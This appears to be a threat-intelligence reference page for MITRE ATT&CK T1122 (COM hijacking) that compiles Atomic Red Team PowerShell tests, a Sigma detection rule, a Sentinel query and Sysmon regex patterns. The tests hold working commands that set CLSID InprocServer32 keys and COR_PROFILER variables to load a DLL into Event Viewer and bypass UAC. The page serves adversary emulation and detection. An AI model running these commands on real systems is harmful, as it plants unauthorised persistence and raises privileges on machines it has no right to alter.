
# Component Object Model Hijacking

## Description

### MITRE Description

> The Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.

## Additional Attributes

* Bypass: ['Autoruns Analysis']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1122

## Potential Commands

```
Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value PathToAtomicsFolder\T1122\bin\T1122x64.dll -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value PathToAtomicsFolder\T1122\bin\T1122x64.dll -Force | Out-Null
Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC

Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value #{file_name} -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC

Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value PathToAtomicsFolder\T1122\bin\T1122x64.dll -Force | Out-Null

Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null

$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = 'PathToAtomicsFolder\T1122\bin\T1122x64.dll'
POWERSHELL -c 'Start-Sleep 1'

$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'
$env:COR_PROFILER_PATH = '#{file_name}'
POWERSHELL -c 'Start-Sleep 1'

\\Software\\Classes\\CLSID\\.+\\InprocServer32
\\Software\\Classes\\CLSID\\.+\\InprocServer32
```

## Commands Dataset

```
[{'command': 'Write-Host "Creating registry keys in '
             'HKCU:Software\\Classes\\CLSID\\#{clsid_guid}" -ForegroundColor '
             'Cyan\n'
             'New-Item -Path '
             '"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32" '
             '-Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | '
             'Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | '
             'Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name "COR_PROFILER" '
             '-PropertyType String -Value "#{clsid_guid}" -Force | Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_PROFILER_PATH" -PropertyType String -Value '
             'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\n'
             'Write-Host "executing eventvwr.msc" -ForegroundColor Cyan\n'
             'START MMC.EXE EVENTVWR.MSC\n',
  'name': None,
  'source': 'atomics/T1122/T1122.yaml'},
 {'command': 'Write-Host "Creating registry keys in '
             'HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}" '
             '-ForegroundColor Cyan\n'
             'New-Item -Path '
             '"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32" '
             '-Value #{file_name} -Force | Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | '
             'Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name "COR_PROFILER" '
             '-PropertyType String -Value '
             '"{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_PROFILER_PATH" -PropertyType String -Value #{file_name} '
             '-Force | Out-Null\n'
             'Write-Host "executing eventvwr.msc" -ForegroundColor Cyan\n'
             'START MMC.EXE EVENTVWR.MSC\n',
  'name': None,
  'source': 'atomics/T1122/T1122.yaml'},
 {'command': 'Write-Host "Creating system environment variables" '
             '-ForegroundColor Cyan\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
             '-PropertyType String -Value "1" -Force | Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
             '-Value "#{clsid_guid}" -Force | Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
             'String -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll '
             '-Force | Out-Null\n',
  'name': None,
  'source': 'atomics/T1122/T1122.yaml'},
 {'command': 'Write-Host "Creating system environment variables" '
             '-ForegroundColor Cyan\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
             '-PropertyType String -Value "1" -Force | Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
             '-Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | '
             'Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
             'String -Value #{file_name} -Force | Out-Null\n',
  'name': None,
  'source': 'atomics/T1122/T1122.yaml'},
 {'command': '$env:COR_ENABLE_PROFILING = 1\n'
             "$env:COR_PROFILER = '#{clsid_guid}'\n"
             '$env:COR_PROFILER_PATH = '
             "'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll'\n"
             "POWERSHELL -c 'Start-Sleep 1'\n",
  'name': None,
  'source': 'atomics/T1122/T1122.yaml'},
 {'command': '$env:COR_ENABLE_PROFILING = 1\n'
             "$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'\n"
             "$env:COR_PROFILER_PATH = '#{file_name}'\n"
             "POWERSHELL -c 'Start-Sleep 1'\n",
  'name': None,
  'source': 'atomics/T1122/T1122.yaml'},
 {'command': '\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32',
  'name': None,
  'source': 'SysmonHunter - Component Object Model Hijacking'},
 {'command': '\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32',
  'name': None,
  'source': 'SysmonHunter - Component Object Model Hijacking'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Kutepov Anton, oscd.community',
                  'date': '2019/10/23',
                  'description': 'Detects COM object hijacking via TreatAs '
                                 'subkey',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 12,
                                              'TargetObject|contains': '_Classes\\CLSID\\',
                                              'TargetObject|endswith': '\\TreatAs',
                                              'TargetObject|startswith': 'HKU\\'}},
                  'falsepositives': ['Maybe some system utilities in rare '
                                     'cases use linking keys for backward '
                                     'compability'],
                  'id': '9b0f8a61-91b2-464f-aceb-0527e0a45020',
                  'level': 'medium',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'modified': '2019/11/07',
                  'references': ['https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1122'],
                  'title': 'Windows Registry Persistence - COM key linking'}}]
```

## Potential Queries

```json
[{'name': 'Component Object Model Hijacking',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and '
           'registry_key_path contains "\\\\Software\\\\Classes\\\\CLSID\\\\"'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Component Object Model (COM) Hijacking': {'atomic_tests': [{'dependencies': [{'description': '#{file_name} '
                                                                                                                       'must '
                                                                                                                       'be '
                                                                                                                       'present\n',
                                                                                                        'get_prereq_command': 'New-Item '
                                                                                                                              '-Type '
                                                                                                                              'Directory '
                                                                                                                              '(split-path '
                                                                                                                              '#{file_name}) '
                                                                                                                              '-ErrorAction '
                                                                                                                              'ignore '
                                                                                                                              '| '
                                                                                                                              'Out-Null\n'
                                                                                                                              'Invoke-WebRequest '
                                                                                                                              '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" '
                                                                                                                              '-OutFile '
                                                                                                                              '"#{file_name}"\n',
                                                                                                        'prereq_command': 'if '
                                                                                                                          '(Test-Path '
                                                                                                                          '#{file_name}) '
                                                                                                                          '{exit '
                                                                                                                          '0} '
                                                                                                                          'else '
                                                                                                                          '{exit '
                                                                                                                          '1}\n'}],
                                                                                      'dependency_executor_name': 'powershell',
                                                                                      'description': 'Creates '
                                                                                                     'user '
                                                                                                     'scope '
                                                                                                     'environment '
                                                                                                     'variables '
                                                                                                     'and '
                                                                                                     'CLSID '
                                                                                                     'COM '
                                                                                                     'object '
                                                                                                     'to '
                                                                                                     'enable '
                                                                                                     'a '
                                                                                                     '.NET '
                                                                                                     'profiler '
                                                                                                     '(COR_PROFILER). '
                                                                                                     'The '
                                                                                                     'unmanaged '
                                                                                                     'profiler '
                                                                                                     'DLL '
                                                                                                     '(`atomicNotepad.dll`) '
                                                                                                     'executes '
                                                                                                     'when '
                                                                                                     'the '
                                                                                                     'CLR '
                                                                                                     'is '
                                                                                                     'loaded '
                                                                                                     'by '
                                                                                                     'the '
                                                                                                     'Event '
                                                                                                     'Viewer '
                                                                                                     'process. '
                                                                                                     'Additionally, '
                                                                                                     'the '
                                                                                                     'profiling '
                                                                                                     'DLL '
                                                                                                     'will '
                                                                                                     'inherit '
                                                                                                     'the '
                                                                                                     'integrity '
                                                                                                     'level '
                                                                                                     'of '
                                                                                                     'Event '
                                                                                                     'Viewer '
                                                                                                     'bypassing '
                                                                                                     'UAC '
                                                                                                     'and '
                                                                                                     'executing '
                                                                                                     '`notepad.exe` '
                                                                                                     'with '
                                                                                                     'high '
                                                                                                     'integrity. '
                                                                                                     'If '
                                                                                                     'the '
                                                                                                     'account '
                                                                                                     'used '
                                                                                                     'is '
                                                                                                     'not '
                                                                                                     'a '
                                                                                                     'local '
                                                                                                     'administrator '
                                                                                                     'the '
                                                                                                     'profiler '
                                                                                                     'DLL '
                                                                                                     'will '
                                                                                                     'still '
                                                                                                     'execute '
                                                                                                     'each '
                                                                                                     'time '
                                                                                                     'the '
                                                                                                     'CLR '
                                                                                                     'is '
                                                                                                     'loaded '
                                                                                                     'by '
                                                                                                     'a '
                                                                                                     'process, '
                                                                                                     'however, '
                                                                                                     'the '
                                                                                                     'notepad '
                                                                                                     'process '
                                                                                                     'will '
                                                                                                     'not '
                                                                                                     'execute '
                                                                                                     'with '
                                                                                                     'high '
                                                                                                     'integrity. \n',
                                                                                      'executor': {'cleanup_command': 'Write-Host '
                                                                                                                      '"Removing '
                                                                                                                      'registry '
                                                                                                                      'keys" '
                                                                                                                      '-ForegroundColor '
                                                                                                                      'Cyan\n'
                                                                                                                      'Remove-Item '
                                                                                                                      '-Path '
                                                                                                                      '"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}" '
                                                                                                                      '-Recurse '
                                                                                                                      '-Force\n'
                                                                                                                      'Remove-ItemProperty '
                                                                                                                      '-Path '
                                                                                                                      'HKCU:\\Environment '
                                                                                                                      '-Name '
                                                                                                                      '"COR_ENABLE_PROFILING" '
                                                                                                                      '-Force '
                                                                                                                      '| '
                                                                                                                      'Out-Null\n'
                                                                                                                      'Remove-ItemProperty '
                                                                                                                      '-Path '
                                                                                                                      'HKCU:\\Environment '
                                                                                                                      '-Name '
                                                                                                                      '"COR_PROFILER" '
                                                                                                                      '-Force '
                                                                                                                      '| '
                                                                                                                      'Out-Null\n'
                                                                                                                      'Remove-ItemProperty '
                                                                                                                      '-Path '
                                                                                                                      'HKCU:\\Environment '
                                                                                                                      '-Name '
                                                                                                                      '"COR_PROFILER_PATH" '
                                                                                                                      '-Force '
                                                                                                                      '| '
                                                                                                                      'Out-Null\n',
                                                                                                   'command': 'Write-Host '
                                                                                                              '"Creating '
                                                                                                              'registry '
                                                                                                              'keys '
                                                                                                              'in '
                                                                                                              'HKCU:Software\\Classes\\CLSID\\#{clsid_guid}" '
                                                                                                              '-ForegroundColor '
                                                                                                              'Cyan\n'
                                                                                                              'New-Item '
                                                                                                              '-Path '
                                                                                                              '"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32" '
                                                                                                              '-Value '
                                                                                                              '#{file_name} '
                                                                                                              '-Force '
                                                                                                              '| '
                                                                                                              'Out-Null\n'
                                                                                                              'New-ItemProperty '
                                                                                                              '-Path '
                                                                                                              'HKCU:\\Environment '
                                                                                                              '-Name '
                                                                                                              '"COR_ENABLE_PROFILING" '
                                                                                                              '-PropertyType '
                                                                                                              'String '
                                                                                                              '-Value '
                                                                                                              '"1" '
                                                                                                              '-Force '
                                                                                                              '| '
                                                                                                              'Out-Null\n'
                                                                                                              'New-ItemProperty '
                                                                                                              '-Path '
                                                                                                              'HKCU:\\Environment '
                                                                                                              '-Name '
                                                                                                              '"COR_PROFILER" '
                                                                                                              '-PropertyType '
                                                                                                              'String '
                                                                                                              '-Value '
                                                                                                              '"#{clsid_guid}" '
                                                                                                              '-Force '
                                                                                                              '| '
                                                                                                              'Out-Null\n'
                                                                                                              'New-ItemProperty '
                                                                                                              '-Path '
                                                                                                              'HKCU:\\Environment '
                                                                                                              '-Name '
                                                                                                              '"COR_PROFILER_PATH" '
                                                                                                              '-PropertyType '
                                                                                                              'String '
                                                                                                              '-Value '
                                                                                                              '#{file_name} '
                                                                                                              '-Force '
                                                                                                              '| '
                                                                                                              'Out-Null\n'
                                                                                                              'Write-Host '
                                                                                                              '"executing '
                                                                                                              'eventvwr.msc" '
                                                                                                              '-ForegroundColor '
                                                                                                              'Cyan\n'
                                                                                                              'START '
                                                                                                              'MMC.EXE '
                                                                                                              'EVENTVWR.MSC\n',
                                                                                                   'elevation_required': False,
                                                                                                   'name': 'powershell'},
                                                                                      'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
                                                                                                                         'description': 'custom '
                                                                                                                                        'clsid '
                                                                                                                                        'guid',
                                                                                                                         'type': 'String'},
                                                                                                          'file_name': {'default': 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll',
                                                                                                                        'description': 'unmanaged '
                                                                                                                                       'profiler '
                                                                                                                                       'DLL',
                                                                                                                        'type': 'Path'}},
                                                                                      'name': 'COM '
                                                                                              'Hijack '
                                                                                              'Leveraging '
                                                                                              'user '
                                                                                              'scope '
                                                                                              'COR_PROFILER',
                                                                                      'supported_platforms': ['windows']},
                                                                                     {'dependencies': [{'description': '#{file_name} '
                                                                                                                       'must '
                                                                                                                       'be '
                                                                                                                       'present\n',
                                                                                                        'get_prereq_command': 'New-Item '
                                                                                                                              '-Type '
                                                                                                                              'Directory '
                                                                                                                              '(split-path '
                                                                                                                              '#{file_name}) '
                                                                                                                              '-ErrorAction '
                                                                                                                              'ignore '
                                                                                                                              '| '
                                                                                                                              'Out-Null\n'
                                                                                                                              'Invoke-WebRequest '
                                                                                                                              '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" '
                                                                                                                              '-OutFile '
                                                                                                                              '"#{file_name}"\n',
                                                                                                        'prereq_command': 'if '
                                                                                                                          '(Test-Path '
                                                                                                                          '#{file_name}) '
                                                                                                                          '{exit '
                                                                                                                          '0} '
                                                                                                                          'else '
                                                                                                                          '{exit '
                                                                                                                          '1}\n'}],
                                                                                      'dependency_executor_name': 'powershell',
                                                                                      'description': 'Creates '
                                                                                                     'system '
                                                                                                     'scope '
                                                                                                     'environment '
                                                                                                     'variables '
                                                                                                     'to '
                                                                                                     'enable '
                                                                                                     'a '
                                                                                                     '.NET '
                                                                                                     'profiler '
                                                                                                     '(COR_PROFILER). '
                                                                                                     'System '
                                                                                                     'scope '
                                                                                                     'environment '
                                                                                                     'variables '
                                                                                                     'require '
                                                                                                     'a '
                                                                                                     'restart '
                                                                                                     'to '
                                                                                                     'take '
                                                                                                     'effect. '
                                                                                                     'The '
                                                                                                     'unmanaged '
                                                                                                     'profiler '
                                                                                                     'DLL '
                                                                                                     '(`atomicNotepad.dll`) '
                                                                                                     'executes '
                                                                                                     'when '
                                                                                                     'the '
                                                                                                     'CLR '
                                                                                                     'is '
                                                                                                     'loaded '
                                                                                                     'by '
                                                                                                     'any '
                                                                                                     'process. '
                                                                                                     'Additionally, '
                                                                                                     'the '
                                                                                                     'profiling '
                                                                                                     'DLL '
                                                                                                     'will '
                                                                                                     'inherit '
                                                                                                     'the '
                                                                                                     'integrity '
                                                                                                     'level '
                                                                                                     'of '
                                                                                                     'Event '
                                                                                                     'Viewer '
                                                                                                     'bypassing '
                                                                                                     'UAC '
                                                                                                     'and '
                                                                                                     'executing '
                                                                                                     '`notepad.exe` '
                                                                                                     'with '
                                                                                                     'high '
                                                                                                     'integrity. '
                                                                                                     'If '
                                                                                                     'the '
                                                                                                     'account '
                                                                                                     'used '
                                                                                                     'is '
                                                                                                     'not '
                                                                                                     'a '
                                                                                                     'local '
                                                                                                     'administrator '
                                                                                                     'the '
                                                                                                     'profiler '
                                                                                                     'DLL '
                                                                                                     'will '
                                                                                                     'still '
                                                                                                     'execute '
                                                                                                     'each '
                                                                                                     'time '
                                                                                                     'the '
                                                                                                     'CLR '
                                                                                                     'is '
                                                                                                     'loaded '
                                                                                                     'by '
                                                                                                     'a '
                                                                                                     'process, '
                                                                                                     'however, '
                                                                                                     'the '
                                                                                                     'notepad '
                                                                                                     'process '
                                                                                                     'will '
                                                                                                     'not '
                                                                                                     'execute '
                                                                                                     'with '
                                                                                                     'high '
                                                                                                     'integrity. \n',
                                                                                      'executor': {'cleanup_command': 'Write-Host '
                                                                                                                      '"Removing '
                                                                                                                      'system '
                                                                                                                      'environment '
                                                                                                                      'variables" '
                                                                                                                      '-ForegroundColor '
                                                                                                                      'Cyan\n'
                                                                                                                      'Remove-ItemProperty '
                                                                                                                      '-Path '
                                                                                                                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                                      "Manager\\Environment' "
                                                                                                                      '-Name '
                                                                                                                      '"COR_ENABLE_PROFILING" '
                                                                                                                      '-Force '
                                                                                                                      '| '
                                                                                                                      'Out-Null\n'
                                                                                                                      'Remove-ItemProperty '
                                                                                                                      '-Path '
                                                                                                                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                                      "Manager\\Environment' "
                                                                                                                      '-Name '
                                                                                                                      '"COR_PROFILER" '
                                                                                                                      '-Force '
                                                                                                                      '| '
                                                                                                                      'Out-Null\n'
                                                                                                                      'Remove-ItemProperty '
                                                                                                                      '-Path '
                                                                                                                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                                      "Manager\\Environment' "
                                                                                                                      '-Name '
                                                                                                                      '"COR_PROFILER_PATH" '
                                                                                                                      '-Force '
                                                                                                                      '| '
                                                                                                                      'Out-Null\n',
                                                                                                   'command': 'Write-Host '
                                                                                                              '"Creating '
                                                                                                              'system '
                                                                                                              'environment '
                                                                                                              'variables" '
                                                                                                              '-ForegroundColor '
                                                                                                              'Cyan\n'
                                                                                                              'New-ItemProperty '
                                                                                                              '-Path '
                                                                                                              "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                              "Manager\\Environment' "
                                                                                                              '-Name '
                                                                                                              '"COR_ENABLE_PROFILING" '
                                                                                                              '-PropertyType '
                                                                                                              'String '
                                                                                                              '-Value '
                                                                                                              '"1" '
                                                                                                              '-Force '
                                                                                                              '| '
                                                                                                              'Out-Null\n'
                                                                                                              'New-ItemProperty '
                                                                                                              '-Path '
                                                                                                              "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                              "Manager\\Environment' "
                                                                                                              '-Name '
                                                                                                              '"COR_PROFILER" '
                                                                                                              '-PropertyType '
                                                                                                              'String '
                                                                                                              '-Value '
                                                                                                              '"#{clsid_guid}" '
                                                                                                              '-Force '
                                                                                                              '| '
                                                                                                              'Out-Null\n'
                                                                                                              'New-ItemProperty '
                                                                                                              '-Path '
                                                                                                              "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                              "Manager\\Environment' "
                                                                                                              '-Name '
                                                                                                              '"COR_PROFILER_PATH" '
                                                                                                              '-PropertyType '
                                                                                                              'String '
                                                                                                              '-Value '
                                                                                                              '#{file_name} '
                                                                                                              '-Force '
                                                                                                              '| '
                                                                                                              'Out-Null\n',
                                                                                                   'elevation_required': True,
                                                                                                   'name': 'powershell'},
                                                                                      'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
                                                                                                                         'description': 'custom '
                                                                                                                                        'clsid '
                                                                                                                                        'guid',
                                                                                                                         'type': 'String'},
                                                                                                          'file_name': {'default': 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll',
                                                                                                                        'description': 'unmanaged '
                                                                                                                                       'profiler '
                                                                                                                                       'DLL',
                                                                                                                        'type': 'Path'}},
                                                                                      'name': 'COM '
                                                                                              'Hijack '
                                                                                              'Leveraging '
                                                                                              'System '
                                                                                              'Scope '
                                                                                              'COR_PROFILER',
                                                                                      'supported_platforms': ['windows']},
                                                                                     {'dependencies': [{'description': '#{file_name} '
                                                                                                                       'must '
                                                                                                                       'be '
                                                                                                                       'present\n',
                                                                                                        'get_prereq_command': 'New-Item '
                                                                                                                              '-Type '
                                                                                                                              'Directory '
                                                                                                                              '(split-path '
                                                                                                                              '#{file_name}) '
                                                                                                                              '-ErrorAction '
                                                                                                                              'ignore '
                                                                                                                              '| '
                                                                                                                              'Out-Null\n'
                                                                                                                              'Invoke-WebRequest '
                                                                                                                              '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" '
                                                                                                                              '-OutFile '
                                                                                                                              '"#{file_name}"\n',
                                                                                                        'prereq_command': 'if '
                                                                                                                          '(Test-Path '
                                                                                                                          '#{file_name}) '
                                                                                                                          '{exit '
                                                                                                                          '0} '
                                                                                                                          'else '
                                                                                                                          '{exit '
                                                                                                                          '1}\n'}],
                                                                                      'dependency_executor_name': 'powershell',
                                                                                      'description': 'Creates '
                                                                                                     'process '
                                                                                                     'scope '
                                                                                                     'environment '
                                                                                                     'variables '
                                                                                                     'to '
                                                                                                     'enable '
                                                                                                     'a '
                                                                                                     '.NET '
                                                                                                     'profiler '
                                                                                                     '(COR_PROFILER) '
                                                                                                     'without '
                                                                                                     'making '
                                                                                                     'changes '
                                                                                                     'to '
                                                                                                     'the '
                                                                                                     'registry. '
                                                                                                     'The '
                                                                                                     'unmanaged '
                                                                                                     'profiler '
                                                                                                     'DLL '
                                                                                                     '(`atomicNotepad.dll`) '
                                                                                                     'executes '
                                                                                                     'when '
                                                                                                     'the '
                                                                                                     'CLR '
                                                                                                     'is '
                                                                                                     'loaded '
                                                                                                     'by '
                                                                                                     'PowerShell.\n',
                                                                                      'executor': {'cleanup_command': '$env:COR_ENABLE_PROFILING '
                                                                                                                      '= '
                                                                                                                      '0\n'
                                                                                                                      '$env:COR_PROFILER '
                                                                                                                      '= '
                                                                                                                      "''\n"
                                                                                                                      '$env:COR_PROFILER_PATH '
                                                                                                                      '= '
                                                                                                                      "''\n",
                                                                                                   'command': '$env:COR_ENABLE_PROFILING '
                                                                                                              '= '
                                                                                                              '1\n'
                                                                                                              '$env:COR_PROFILER '
                                                                                                              '= '
                                                                                                              "'#{clsid_guid}'\n"
                                                                                                              '$env:COR_PROFILER_PATH '
                                                                                                              '= '
                                                                                                              "'#{file_name}'\n"
                                                                                                              'POWERSHELL '
                                                                                                              '-c '
                                                                                                              "'Start-Sleep "
                                                                                                              "1'\n",
                                                                                                   'elevation_required': False,
                                                                                                   'name': 'powershell'},
                                                                                      'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
                                                                                                                         'description': 'custom '
                                                                                                                                        'clsid '
                                                                                                                                        'guid',
                                                                                                                         'type': 'String'},
                                                                                                          'file_name': {'default': 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll',
                                                                                                                        'description': 'unamanged '
                                                                                                                                       'profiler '
                                                                                                                                       'DLL',
                                                                                                                        'type': 'Path'}},
                                                                                      'name': 'COM '
                                                                                              'Hijack '
                                                                                              'Leveraging '
                                                                                              'registry-free '
                                                                                              'process '
                                                                                              'scope '
                                                                                              'COR_PROFILER',
                                                                                      'supported_platforms': ['windows']}],
                                                                    'attack_technique': 'T1122',
                                                                    'display_name': 'Component '
                                                                                    'Object '
                                                                                    'Model '
                                                                                    '(COM) '
                                                                                    'Hijacking'}},
 {'SysmonHunter - T1122': {'description': None,
                           'level': 'medium',
                           'name': 'Component Object Model Hijacking',
                           'phase': 'Persistence',
                           'query': [{'reg': {'path': {'flag': 'regex',
                                                       'pattern': '\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'flag': 'regex',
                                                              'pattern': '\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Persistence](../tactics/Persistence.md)
    

# Mitigations

None

# Actors


* [APT28](../actors/APT28.md)

